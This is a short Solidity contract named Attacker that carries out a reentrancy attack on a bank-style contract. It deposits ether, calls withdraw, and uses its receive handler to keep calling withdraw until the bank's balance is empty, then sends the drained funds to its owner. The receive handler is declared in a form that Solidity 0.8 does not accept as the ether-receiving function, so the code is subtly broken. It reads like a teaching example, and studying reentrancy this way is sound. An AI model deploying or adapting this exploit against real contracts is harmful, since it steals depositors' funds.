// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank{
    function deposit() external payable;
    function withdraw() external;
}


contract Attacker is Ownable{

    IBank public immutable bank;

    constructor(address _bank){
        bank = IBank(_bank);
    }

    function attack() external payable onlyOwner{
        
        // Deposit
        bank.deposit{value: msg.value}();

        // Withdraw
        bank.withdraw();
    }

    // ************Receive ether
    // This is where the reentrancy happens, the withdraw function is
    // continuously called here.
    function receive() external payable{

        // Conditional to drain the entire wallet
        // Call withdraw function until bank balance = 0
        if(address(bank).balance > 0){
            bank.withdraw();
        }else{

            // Send funds to attacker
            payable(owner()).transfer(address(this).balance);
        }
    }
}
